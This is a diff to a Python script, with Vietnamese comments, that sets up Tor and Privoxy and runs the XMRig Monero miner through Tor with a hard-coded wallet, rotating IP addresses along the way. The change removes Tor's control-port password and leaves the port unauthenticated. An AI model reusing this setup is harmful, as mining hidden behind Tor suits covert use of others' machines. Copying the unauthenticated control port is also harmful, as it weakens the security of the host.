@@ -15,7 +15,6 @@ POOL = "xmr-us-west1.nanopool.org:10343"
 USERNAME = "44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao"
 ALGO = "rx/0"
 DONATE = "1"
-TOR_PASSWORD = "your_tor_password"
 
 # Step 1: Cài đặt Tor và Privoxy
 def install_tor_privoxy():
@@ -37,12 +36,11 @@ def configure_privoxy():
         return False
     return True
 
-# Step 3: Cấu hình Tor để sử dụng mật khẩu cho điều khiển
+# Step 3: Cấu hình Tor mà không yêu cầu mật khẩu
 def configure_tor():
     try:
         with open("/etc/tor/torrc", "a") as torrc_file:
-            hashed_password = subprocess.check_output(["tor", "--hash-password", TOR_PASSWORD]).decode().strip()
-            torrc_file.write(f"\nControlPort 9051\nHashedControlPassword {hashed_password}\n")
+            torrc_file.write(f"\nControlPort 9051\n")
     except Exception as e:
         print(f"Error configuring Tor: {e}")
         return False
@@ -91,7 +89,7 @@ def set_permissions(xmrig_path):
 # Step 9: Yêu cầu thay đổi IP qua Tor
 def renew_connection():
     with Controller.from_port(port=9051) as controller:
-        controller.authenticate(password=TOR_PASSWORD)
+        controller.authenticate()  # Không cần mật khẩu nếu không đặt HashedControlPassword
         controller.signal(Signal.NEWNYM)
 
 # Step 10: Chạy XMRig thông qua Tor proxy bằng torsocks
